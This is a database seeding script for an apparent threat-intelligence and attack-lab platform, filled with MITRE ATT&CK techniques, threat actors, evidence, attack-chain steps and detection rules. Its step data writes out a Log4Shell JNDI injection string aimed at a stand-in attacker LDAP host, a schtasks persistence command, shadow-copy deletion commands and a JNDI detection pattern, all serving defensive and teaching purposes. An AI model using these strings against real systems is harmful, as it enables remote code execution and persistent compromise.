-- ============================================================
-- SYNTRA PostgreSQL Full Database Initialization Script
-- Run automatically on container first startup
-- ============================================================

CREATE EXTENSION IF NOT EXISTS pgcrypto;

CREATE SEQUENCE IF NOT EXISTS users_id_seq;
CREATE SEQUENCE IF NOT EXISTS otp_codes_id_seq;
CREATE SEQUENCE IF NOT EXISTS detections_id_seq;
CREATE SEQUENCE IF NOT EXISTS mitigations_id_seq;

CREATE TABLE IF NOT EXISTS users (
    id CHARACTER VARYING(64) DEFAULT nextval('users_id_seq'::regclass) NOT NULL,
    email CHARACTER VARYING(255),
    name CHARACTER VARYING(255),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    password_hash CHARACTER VARYING(255),
    role CHARACTER VARYING(32) DEFAULT 'analyst'::character varying,
    avatar_url TEXT,
    is_verified BOOLEAN DEFAULT false,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT now(),
    phone CHARACTER VARYING(64)
);
CREATE TABLE IF NOT EXISTS otp_codes (
    id INTEGER DEFAULT nextval('otp_codes_id_seq'::regclass) NOT NULL,
    email CHARACTER VARYING(255) NOT NULL,
    code CHARACTER VARYING(10) NOT NULL,
    flow CHARACTER VARYING(32) DEFAULT 'signup'::character varying NOT NULL,
    expires_at TIMESTAMP WITH TIME ZONE NOT NULL,
    used_at TIMESTAMP WITH TIME ZONE,
    attempts INTEGER DEFAULT 0,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now(),
    max_attempts INTEGER DEFAULT 5,
    phone CHARACTER VARYING(64)
);
CREATE TABLE IF NOT EXISTS sources (
    id CHARACTER VARYING(64) NOT NULL,
    name CHARACTER VARYING(255) NOT NULL,
    url TEXT,
    kind CHARACTER VARYING(64),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS entities (
    id CHARACTER VARYING(64) NOT NULL,
    type CHARACTER VARYING(32) NOT NULL,
    name CHARACTER VARYING(255) NOT NULL,
    taxonomy CHARACTER VARYING(255),
    description TEXT,
    description_status CHARACTER VARYING(64) DEFAULT 'source_supported'::character varying,
    summary TEXT,
    missing_evidence JSONB DEFAULT '[]'::jsonb,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS entity_sources (
    entity_id CHARACTER VARYING(64) NOT NULL,
    source_id CHARACTER VARYING(64) NOT NULL
);
CREATE TABLE IF NOT EXISTS provenance (
    id CHARACTER VARYING(64) NOT NULL,
    entity_id CHARACTER VARYING(64),
    provenance_type CHARACTER VARYING(128) NOT NULL,
    source_name CHARACTER VARYING(255) NOT NULL,
    source_ref CHARACTER VARYING(255),
    source_url TEXT,
    version_or_date CHARACTER VARYING(64),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS relationships (
    id CHARACTER VARYING(64) NOT NULL,
    from_id CHARACTER VARYING(64) NOT NULL,
    relation_type CHARACTER VARYING(64) NOT NULL,
    to_id CHARACTER VARYING(64) NOT NULL,
    provenance_type CHARACTER VARYING(128),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS evidence (
    id CHARACTER VARYING(64) NOT NULL,
    ref_id CHARACTER VARYING(64) NOT NULL,
    status CHARACTER VARYING(32) DEFAULT 'confirmed'::character varying NOT NULL,
    category CHARACTER VARYING(32) DEFAULT 'source'::character varying NOT NULL,
    text TEXT NOT NULL,
    source_id CHARACTER VARYING(64),
    source_name CHARACTER VARYING(255) NOT NULL,
    source_url TEXT,
    source_ref CHARACTER VARYING(255),
    evidence_ref CHARACTER VARYING(255),
    provenance_type CHARACTER VARYING(128) NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS attack_chain_stages (
    id CHARACTER VARYING(64) NOT NULL,
    entity_id CHARACTER VARYING(64),
    stage_order INTEGER DEFAULT 0,
    technique_id CHARACTER VARYING(64) NOT NULL,
    technique_name CHARACTER VARYING(255) NOT NULL,
    tactic CHARACTER VARYING(128) NOT NULL,
    status CHARACTER VARYING(32) DEFAULT 'confirmed'::character varying,
    evidence_ids JSONB DEFAULT '[]'::jsonb,
    description TEXT,
    steps JSONB DEFAULT '[]'::jsonb,
    lab_available BOOLEAN DEFAULT false,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS detections (
    id INTEGER DEFAULT nextval('detections_id_seq'::regclass) NOT NULL,
    entity_id CHARACTER VARYING(64),
    title CHARACTER VARYING(255) NOT NULL,
    description TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS mitigations (
    id INTEGER DEFAULT nextval('mitigations_id_seq'::regclass) NOT NULL,
    entity_id CHARACTER VARYING(64),
    mitigation_id CHARACTER VARYING(64),
    title CHARACTER VARYING(255) NOT NULL,
    description TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS labs (
    lab_id CHARACTER VARYING(64) NOT NULL,
    technique_id CHARACTER VARYING(64) NOT NULL,
    technique_name CHARACTER VARYING(255) NOT NULL,
    available BOOLEAN DEFAULT true,
    launchable BOOLEAN DEFAULT true,
    lab_type CHARACTER VARYING(128) DEFAULT 'Controlled Technique Validation'::character varying,
    platform CHARACTER VARYING(32) DEFAULT 'windows'::character varying,
    runtime_environment CHARACTER VARYING(255),
    network_mode CHARACTER VARYING(128),
    validation_source CHARACTER VARYING(255),
    objective TEXT,
    estimated_duration CHARACTER VARYING(64),
    difficulty CHARACTER VARYING(64),
    safety_boundary TEXT,
    session_steps JSONB DEFAULT '[]'::jsonb,
    scenario_objective TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS lab_sessions (
    session_id CHARACTER VARYING(64) NOT NULL,
    user_id CHARACTER VARYING(64),
    lab_id CHARACTER VARYING(64),
    technique_id CHARACTER VARYING(64) NOT NULL,
    status CHARACTER VARYING(32) DEFAULT 'ready'::character varying,
    connection_url TEXT,
    expires_at TIMESTAMP WITH TIME ZONE NOT NULL,
    telemetry JSONB,
    logs JSONB DEFAULT '[]'::jsonb,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now(),
    terminated_at TIMESTAMP WITH TIME ZONE
);
CREATE TABLE IF NOT EXISTS threads (
    id CHARACTER VARYING(64) DEFAULT gen_random_uuid() NOT NULL,
    user_id CHARACTER VARYING(64),
    question TEXT NOT NULL,
    status_kind CHARACTER VARYING(50) DEFAULT 'unverified'::character varying,
    turn_count INTEGER DEFAULT 1,
    pinned BOOLEAN DEFAULT false,
    archived BOOLEAN DEFAULT false,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    investigation_id CHARACTER VARYING(64),
    preview TEXT,
    mode CHARACTER VARYING(32) DEFAULT 'standard'::character varying,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS thread_turns (
    id CHARACTER VARYING(64) NOT NULL,
    thread_id CHARACTER VARYING(64),
    question TEXT NOT NULL,
    answer TEXT,
    uncertainty TEXT,
    outcome CHARACTER VARYING(50) DEFAULT 'ok'::character varying,
    result_json JSONB NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);
CREATE TABLE IF NOT EXISTS exports (
    id CHARACTER VARYING(64) NOT NULL,
    thread_id CHARACTER VARYING(64),
    user_id CHARACTER VARYING(64),
    format CHARACTER VARYING(32) NOT NULL,
    file_name CHARACTER VARYING(255) NOT NULL,
    file_content TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT now()
);

-- Primary Keys
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_users') THEN ALTER TABLE users ADD CONSTRAINT pk_users PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_otp_codes') THEN ALTER TABLE otp_codes ADD CONSTRAINT pk_otp_codes PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_sources') THEN ALTER TABLE sources ADD CONSTRAINT pk_sources PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_entities') THEN ALTER TABLE entities ADD CONSTRAINT pk_entities PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_evidence') THEN ALTER TABLE evidence ADD CONSTRAINT pk_evidence PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_attack_chain_stages') THEN ALTER TABLE attack_chain_stages ADD CONSTRAINT pk_attack_chain_stages PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_labs') THEN ALTER TABLE labs ADD CONSTRAINT pk_labs PRIMARY KEY (lab_id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_threads') THEN ALTER TABLE threads ADD CONSTRAINT pk_threads PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_thread_turns') THEN ALTER TABLE thread_turns ADD CONSTRAINT pk_thread_turns PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_exports') THEN ALTER TABLE exports ADD CONSTRAINT pk_exports PRIMARY KEY (id); END IF; END $$;
DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_constraint WHERE conname = 'pk_lab_sessions') THEN ALTER TABLE lab_sessions ADD CONSTRAINT pk_lab_sessions PRIMARY KEY (session_id); END IF; END $$;

-- ============================================================
-- Static Reference Data Seeding
-- ============================================================

-- Seeding sources (6 rows)
INSERT INTO sources (id, name, url, kind, created_at) VALUES ('src_mitre_t1053', 'MITRE ATT&CK — T1053.005', 'https://attack.mitre.org/techniques/T1053/005/', 'framework', '2026-11-11 17:07:38.464884+02:00') ON CONFLICT DO NOTHING;
INSERT INTO sources (id, name, url, kind, created_at) VALUES ('src_mitre_g0022', 'MITRE ATT&CK — Group G0022 (APT3)', 'https://attack.mitre.org/groups/G0022/', 'framework', '2026-11-11 17:07:38.466916+02:00') ON CONFLICT DO NOTHING;
INSERT INTO sources (id, name, url, kind, created_at) VALUES ('src_mitre_t1566', 'MITRE ATT&CK — T1566 Phishing', 'https://attack.mitre.org/techniques/T1566/', 'framework', '2026-11-11 17:07:38.467707+02:00') ON CONFLICT DO NOTHING;
INSERT INTO sources (id, name, url, kind, created_at) VALUES ('src_mitre_t1059', 'MITRE ATT&CK — T1059 Scripting', 'https://attack.mitre.org/techniques/T1059/', 'framework', '2026-11-11 17:07:38.468288+02:00') ON CONFLICT DO NOTHING;
INSERT INTO sources (id, name, url, kind, created_at) VALUES ('src_nvd_log4j', 'NVD — CVE-2021-44228', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228', 'vulnerability_db', '2026-11-11 17:07:38.468659+02:00') ON CONFLICT DO NOTHING;
INSERT INTO sources (id, name, url, kind, created_at) VALUES ('src_cisa_log4j', 'CISA — Log4j Advisory', 'https://www.cisa.gov/news-events/alerts/2021/12/11/apache-log4j2-recommended-mitigation-measures', 'advisory', '2026-11-11 17:07:38.468932+02:00') ON CONFLICT DO NOTHING;

-- Seeding entities (10 rows)
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('T1566', 'technique', 'Phishing', 'Enterprise ATT&CK', 'Adversaries may send phishing messages to gain access to victim systems via spearphishing links, attachments, or services.', 'source_supported', 'Spearphishing attachments and links remain the predominant initial access vector for advanced threat actors.', '[]'::jsonb, '2026-11-11 17:07:38.463179+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('T1059', 'technique', 'Command and Scripting Interpreter', 'Enterprise ATT&CK', 'Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries (PowerShell, cmd, bash).', 'source_supported', 'Script interpreters facilitate rapid post-compromise reconnaissance and persistence while blending in with legitimate administrative operations.', '[]'::jsonb, '2026-11-11 17:07:38.463712+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('CVE-2021-44228', 'cve', 'Log4Shell (Apache Log4j2 JNDI RCE)', 'NVD / CISA KEV', 'Apache Log4j2 versions 2.0-beta9 through 2.15.0 permit remote code execution when attacker-controlled log messages trigger JNDI lookups.', 'source_supported', 'Log4Shell is a CVSS 10.0 vulnerability permitting unauthenticated remote code execution via LDAP/RMI serialized object deserialization.', '[]'::jsonb, '2026-11-11 17:07:38.464142+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('T1071.001', 'technique', 'Web Protocols', 'Enterprise ATT&CK', 'Adversaries may communicate using application layer protocols associated with web traffic (HTTP/HTTPS) to avoid detection.', 'source_supported', 'Command and control traffic over standard port 80/443 blends in with everyday corporate enterprise traffic.', '[]'::jsonb, '2026-11-11 17:07:38.464521+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('T1053.005', 'technique', 'Scheduled Task', 'Enterprise ATT&CK', 'Adversaries may abuse the Windows Task Scheduler to facilitate initial or recurring execution of malicious code.', 'source_supported', 'Persistence via Task Scheduler remains a premier technique across commodity and APT groups due to native OS integration.', '[]'::jsonb, '2026-11-11 17:07:38.456392+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('APT3', 'threat_actor', 'APT3 (Gothic Panda)', 'MITRE ATT&CK Groups', 'China-nexus threat group active since ~2010 known for spearphishing campaigns and browser exploitation.', 'source_supported', 'APT3 has executed operations targeting aerospace, defense, and high-tech firms utilizing phased initial access and living-off-the-land interpreters.', '["Detailed command and control server infrastructure telemetry is classified."]'::jsonb, '2026-11-11 17:07:38.462266+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('T1486', 'technique', 'Data Encrypted for Impact (Ransomware)', 'Enterprise ATT&CK', 'Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. Adversaries often leave extortion notes with payment instructions in exchange for decryption keys.', 'source_supported', 'Adversaries use asymmetric/symmetric encryption algorithms (AES, RSA, ChaCha20) to lock user documents, databases, and system backups, rendering them inaccessible without paying extortion ransom.', '["Decryption key recovery without payment"]'::jsonb, '2026-11-14 21:33:51.152778+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('T1003.001', 'technique', 'OS Credential Dumping: LSASS Memory (Mimikatz)', 'Enterprise ATT&CK', 'Adversaries may attempt to dump credentials from the Local Security Authority Subsystem Service (LSASS) memory. Following authentication, Windows caches credentials in LSASS memory space which can be extracted using tools like Mimikatz, procdump, or comsvcs.dll.', 'source_supported', 'LSASS memory contains NTLM hashes, Kerberos tickets (TGT/TGS), and cleartext credentials if WDigest is enabled. Attackers dump this memory to obtain lateral movement material.', '["Memory dump without elevated SeDebugPrivilege"]'::jsonb, '2026-11-14 21:33:51.215281+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('APT29', 'threat_actor', 'APT29 (Cozy Bear / Midnight Blizzard / Nobelium)', 'MITRE ATT&CK Groups', 'APT29 is a sophisticated threat group attributed to Russia''s Foreign Intelligence Service (SVR). Known for the SolarWinds supply chain attack and targeting government, diplomatic, think-tank, and healthcare organizations globally.', 'source_supported', 'State-sponsored cyber espionage group operating with high operational security, stealthy credential harvesting, token forgery (Golden SAML), and cloud tenant pivoting.', '["Exact command infrastructure IP allocations"]'::jsonb, '2026-11-14 21:33:51.260386+02:00') ON CONFLICT DO NOTHING;
INSERT INTO entities (id, type, name, taxonomy, description, description_status, summary, missing_evidence, created_at) VALUES ('S0154', 'tool', 'Cobalt Strike (Beacon)', 'MITRE ATT&CK Software', 'Cobalt Strike is a commercial penetration testing tool that provides an adversarial emulation platform including the Beacon post-exploitation agent, malleable C2 profiles, process injection, and lateral movement modules.', 'source_supported', 'Widely abused by ransomware syndicates and advanced threat actors for command and control, privilege escalation, and deploying secondary payloads.', '[]'::jsonb, '2026-11-14 21:33:51.312809+02:00') ON CONFLICT DO NOTHING;

-- Seeding entity_sources (6 rows)
INSERT INTO entity_sources (entity_id, source_id) VALUES ('T1053.005', 'src_mitre_t1053') ON CONFLICT DO NOTHING;
INSERT INTO entity_sources (entity_id, source_id) VALUES ('APT3', 'src_mitre_g0022') ON CONFLICT DO NOTHING;
INSERT INTO entity_sources (entity_id, source_id) VALUES ('T1566', 'src_mitre_t1566') ON CONFLICT DO NOTHING;
INSERT INTO entity_sources (entity_id, source_id) VALUES ('T1059', 'src_mitre_t1059') ON CONFLICT DO NOTHING;
INSERT INTO entity_sources (entity_id, source_id) VALUES ('CVE-2021-44228', 'src_nvd_log4j') ON CONFLICT DO NOTHING;
INSERT INTO entity_sources (entity_id, source_id) VALUES ('CVE-2021-44228', 'src_cisa_log4j') ON CONFLICT DO NOTHING;

-- Seeding provenance (3 rows)
INSERT INTO provenance (id, entity_id, provenance_type, source_name, source_ref, source_url, version_or_date, created_at) VALUES ('prov_t1053', 'T1053.005', 'standard_corpus', 'MITRE ATT&CK', 'ATT&CK v14', 'https://attack.mitre.org/techniques/T1053/005/', '2024-04', '2026-11-11 17:07:38.469214+02:00') ON CONFLICT DO NOTHING;
INSERT INTO provenance (id, entity_id, provenance_type, source_name, source_ref, source_url, version_or_date, created_at) VALUES ('prov_apt3', 'APT3', 'threat_intel_report', 'MITRE ATT&CK', 'G0022', 'https://attack.mitre.org/groups/G0022/', '2024-01', '2026-11-11 17:07:38.472000+02:00') ON CONFLICT DO NOTHING;
INSERT INTO provenance (id, entity_id, provenance_type, source_name, source_ref, source_url, version_or_date, created_at) VALUES ('prov_log4j', 'CVE-2021-44228', 'nvd_advisory', 'NIST NVD', 'CVE-2021-44228', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228', '2021-12', '2026-11-11 17:07:38.472627+02:00') ON CONFLICT DO NOTHING;

-- Seeding relationships (5 rows)
INSERT INTO relationships (id, from_id, relation_type, to_id, provenance_type, created_at) VALUES ('rel_01', 'T1053.005', 'subtechnique-of', 'T1053', 'mitre_taxonomy', '2026-11-11 17:07:38.473174+02:00') ON CONFLICT DO NOTHING;
INSERT INTO relationships (id, from_id, relation_type, to_id, provenance_type, created_at) VALUES ('rel_02', 'APT3', 'uses', 'T1566', 'mitre_attribution', '2026-11-11 17:07:38.474802+02:00') ON CONFLICT DO NOTHING;
INSERT INTO relationships (id, from_id, relation_type, to_id, provenance_type, created_at) VALUES ('rel_03', 'APT3', 'uses', 'T1059', 'mitre_attribution', '2026-11-11 17:07:38.475124+02:00') ON CONFLICT DO NOTHING;
INSERT INTO relationships (id, from_id, relation_type, to_id, provenance_type, created_at) VALUES ('rel_04', 'T1566', 'leads to', 'T1059', 'attack_graph', '2026-11-11 17:07:38.475376+02:00') ON CONFLICT DO NOTHING;
INSERT INTO relationships (id, from_id, relation_type, to_id, provenance_type, created_at) VALUES ('rel_05', 'CVE-2021-44228', 'exploits', 'T1190', 'vulnerability_mapping', '2026-11-11 17:07:38.475612+02:00') ON CONFLICT DO NOTHING;

-- Seeding evidence (7 rows)
INSERT INTO evidence (id, ref_id, status, category, text, source_id, source_name, source_url, source_ref, evidence_ref, provenance_type, created_at) VALUES ('ev_01', 'T1053.005', 'confirmed', 'source', 'Task Scheduler can be abused using schtasks.exe or Register-ScheduledTask PowerShell cmdlet to trigger tasks as SYSTEM or high-privilege users.', 'src_mitre_t1053', 'MITRE ATT&CK', 'https://attack.mitre.org/techniques/T1053/005/', 'ATT&CK v14', 'T1053.005#detection', 'standard_corpus', '2026-11-11 17:07:38.475863+02:00') ON CONFLICT DO NOTHING;
INSERT INTO evidence (id, ref_id, status, category, text, source_id, source_name, source_url, source_ref, evidence_ref, provenance_type, created_at) VALUES ('ev_apt3_1', 'T1566', 'confirmed', 'source', 'APT3 has sent spearphishing emails containing a link that downloads malicious files and malicious attachments to gain initial network access.', 'src_mitre_g0022', 'MITRE ATT&CK — APT3 (G0022)', 'https://attack.mitre.org/groups/G0022/', 'Group G0022', 'G0022#initial-access', 'direct_source_relationship', '2026-11-11 17:07:38.477010+02:00') ON CONFLICT DO NOTHING;
INSERT INTO evidence (id, ref_id, status, category, text, source_id, source_name, source_url, source_ref, evidence_ref, provenance_type, created_at) VALUES ('ev_apt3_2', 'T1059', 'confirmed', 'source', 'APT3 has used command-line scripting to execute payloads on victim machines, including batch scripts and Windows Command Shell execution.', 'src_mitre_g0022', 'MITRE ATT&CK — APT3 (G0022)', 'https://attack.mitre.org/groups/G0022/', 'Group G0022', 'G0022#execution', 'direct_source_relationship', '2026-11-11 17:07:38.477455+02:00') ON CONFLICT DO NOTHING;
INSERT INTO evidence (id, ref_id, status, category, text, source_id, source_name, source_url, source_ref, evidence_ref, provenance_type, created_at) VALUES ('ev_log4j_1', 'CVE-2021-44228', 'confirmed', 'source', 'Apache Log4j2 versions 2.0-beta9 through 2.15.0 permit remote code execution when attacker-controlled log messages trigger JNDI lookups (CWE-502).', 'src_nvd_log4j', 'NVD — CVE-2021-44228', 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228', 'CVE-2021-44228', 'NVD#cve-detail', 'cve_grounded_source', '2026-11-11 17:07:38.478124+02:00') ON CONFLICT DO NOTHING;
INSERT INTO evidence (id, ref_id, status, category, text, source_id, source_name, source_url, source_ref, evidence_ref, provenance_type, created_at) VALUES ('ev_t1486_1', 'T1486', 'confirmed', 'source', 'Ransomware strains like LockBit and WannaCry traverse drive mounts and encrypt files matching targeted extensions using AES/RSA.', NULL, 'CISA / MITRE ATT&CK', 'https://attack.mitre.org/techniques/T1486/', NULL, NULL, 'standard_corpus', '2026-11-14 21:33:51.375712+02:00') ON CONFLICT DO NOTHING;
INSERT INTO evidence (id, ref_id, status, category, text, source_id, source_name, source_url, source_ref, evidence_ref, provenance_type, created_at) VALUES ('ev_t1003_1', 'T1003.001', 'confirmed', 'source', 'Mimikatz executes sekurlsa::logonpasswords to read LSASS process memory directly using MiniDumpWriteDump or OpenProcess handles.', NULL, 'MITRE ATT&CK', 'https://attack.mitre.org/techniques/T1003/001/', NULL, NULL, 'standard_corpus', '2026-11-14 21:33:51.375712+02:00') ON CONFLICT DO NOTHING;
INSERT INTO evidence (id, ref_id, status, category, text, source_id, source_name, source_url, source_ref, evidence_ref, provenance_type, created_at) VALUES ('ev_apt29_1', 'APT29', 'confirmed', 'source', 'APT29 compromised the SolarWinds build pipeline to distribute the SUNBURST backdoor via digitally signed DLL updates in 2020.', NULL, 'CISA Alert AA20-352A', 'https://www.cisa.gov/news-events/alerts/2020/12/17/active-exploitation-solarwinds-software', NULL, NULL, 'threat_intel_report', '2026-11-14 21:33:51.375712+02:00') ON CONFLICT DO NOTHING;

-- Seeding attack_chain_stages (6 rows)
INSERT INTO attack_chain_stages (id, entity_id, stage_order, technique_id, technique_name, tactic, status, evidence_ids, description, steps, lab_available, created_at) VALUES ('stg_t1053_1', 'T1053.005', 1, 'T1053.005', 'Scheduled Task', 'Persistence', 'confirmed', '["ev_01"]'::jsonb, 'Task created under \Microsoft\Windows\Maintenance with elevated triggers.', '["Identify target persistence path in Task Scheduler registry hive", "Execute schtasks /create /tn ''SecurityUpdate'' /tr ''c:\\temp\\update.exe'' /sc onlogon", "Verify execution upon user logon"]'::jsonb, TRUE, '2026-11-11 17:07:38.478792+02:00') ON CONFLICT DO NOTHING;
INSERT INTO attack_chain_stages (id, entity_id, stage_order, technique_id, technique_name, tactic, status, evidence_ids, description, steps, lab_available, created_at) VALUES ('stg_apt3_1', 'APT3', 1, 'T1566', 'Phishing', 'Initial Access', 'confirmed', '["ev_apt3_1"]'::jsonb, 'Spearphishing email delivered with malicious payload attachment.', '["Craft targeted phishing email with enticing subject", "Deliver email with weaponized document attachment", "Target user opens attachment and enables execution"]'::jsonb, FALSE, '2026-11-11 17:07:38.480690+02:00') ON CONFLICT DO NOTHING;
INSERT INTO attack_chain_stages (id, entity_id, stage_order, technique_id, technique_name, tactic, status, evidence_ids, description, steps, lab_available, created_at) VALUES ('stg_apt3_2', 'APT3', 2, 'T1059', 'Command and Scripting Interpreter', 'Execution', 'confirmed', '["ev_apt3_2"]'::jsonb, 'Execution of malicious batch and PowerShell commands on compromised workstation.', '["Launch cmd.exe / PowerShell in hidden window mode", "Download secondary stager payload from staging host", "Execute local reconnaissance scripts"]'::jsonb, TRUE, '2026-11-11 17:07:38.481144+02:00') ON CONFLICT DO NOTHING;
INSERT INTO attack_chain_stages (id, entity_id, stage_order, technique_id, technique_name, tactic, status, evidence_ids, description, steps, lab_available, created_at) VALUES ('stg_log4j_1', 'CVE-2021-44228', 1, 'CVE-2021-44228', 'Log4j JNDI Lookup Injection', 'Initial Access', 'confirmed', '["ev_log4j_1"]'::jsonb, 'Inbound HTTP request with crafted JNDI string logged by vulnerable application.', '["Inject ${jndi:ldap://attacker-server/payload} into HTTP headers", "Log4j parser encounters JNDI prefix and performs outbound directory query", "Remote Java class is deserialized and executed with application permissions"]'::jsonb, TRUE, '2026-11-11 17:07:38.481615+02:00') ON CONFLICT DO NOTHING;
INSERT INTO attack_chain_stages (id, entity_id, stage_order, technique_id, technique_name, tactic, status, evidence_ids, description, steps, lab_available, created_at) VALUES ('acs_t1486', 'T1486', 1, 'T1486', 'Data Encrypted for Impact', 'Impact', 'confirmed', '["ev_t1486_1"]'::jsonb, 'Ransomware deployment and encryption sequence', '["Inhibit System Recovery via vssadmin", "Traverse local and shared file systems", "Encrypt user files and drop ransom note"]'::jsonb, TRUE, '2026-11-14 21:34:21.505639+02:00') ON CONFLICT DO NOTHING;
INSERT INTO attack_chain_stages (id, entity_id, stage_order, technique_id, technique_name, tactic, status, evidence_ids, description, steps, lab_available, created_at) VALUES ('acs_t1003', 'T1003.001', 1, 'T1003.001', 'OS Credential Dumping: LSASS', 'Credential Access', 'confirmed', '["ev_t1003_1"]'::jsonb, 'Memory dump of LSASS secrets', '["Elevate process privileges to SeDebugPrivilege", "Open LSASS process handle via OpenProcess", "Extract NTLM hashes and plaintext tickets"]'::jsonb, TRUE, '2026-11-14 21:34:21.505639+02:00') ON CONFLICT DO NOTHING;

-- Seeding detections (26 rows)
INSERT INTO detections (id, entity_id, title, description) VALUES (19, 'T1053.005', 'Process Monitoring for schtasks.exe', 'Audit Command Line executions containing /create flags and suspicious /tr parameters (Event ID 4688).') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (20, 'T1053.005', 'Task Scheduler Event Logs', 'Monitor Microsoft-Windows-TaskScheduler/Operational for Event 106 (Task scheduled) and Event 140 (Task updated).') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (21, 'APT3', 'Email Gateway Attachment Sandboxing', 'Quarantine incoming emails with macro-enabled files or double extensions (.pdf.exe).') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (22, 'APT3', 'Script Interpreter Invocation Auditing', 'Flag powershell.exe or cmd.exe spawned by Microsoft Word, Excel, or browser processes.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (23, 'CVE-2021-44228', 'WAF JNDI Pattern Inspection', 'Inspect User-Agent, X-Api-Version, and form inputs for \$\{jndi:(ldap|rmi|dns) strings.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (24, 'CVE-2021-44228', 'Egress LDAP/RMI Traffic Detection', 'Alert on outbound connections from application servers to external IP addresses on ports 389, 636, 1099.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (25, 'T1486', 'Mass File Rename / Extension Alteration Alert', 'Detect rapid file rename events exceeding 50 modifications/sec with entropy > 7.5 indicating cryptographic cipher activity.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (26, 'T1486', 'Volume Shadow Copy Deletion (Event 4688 / Sysmon 1)', 'Monitor execution of vssadmin.exe delete shadows /all /quiet or wmic shadowcopy delete which precedes ransomware execution.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (27, 'T1003.001', 'Sysmon Event 10: Process Access to LSASS', 'Monitor for non-SYSTEM processes opening handles with PROCESS_VM_READ (0x0010) or PROCESS_CREATE_PROCESS (0x0080) to lsass.exe.') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (28, 'T1003.001', 'Windows Defender Credential Guard Audit', 'Enable Credential Guard (LSA Protection) via Group Policy to run LSASS as Protected Process Light (PPL).') ON CONFLICT DO NOTHING;
INSERT INTO detections (id, entity_id, title, description) VALUES (29, 'APT29', 'Abnormal Cloud OAuth App Consent Detection', 'Monitor Azure AD / Entra ID audit logs for high-privilege service principal role assignments and OAuth app registrations.') ON CONFLICT DO NOTHING;
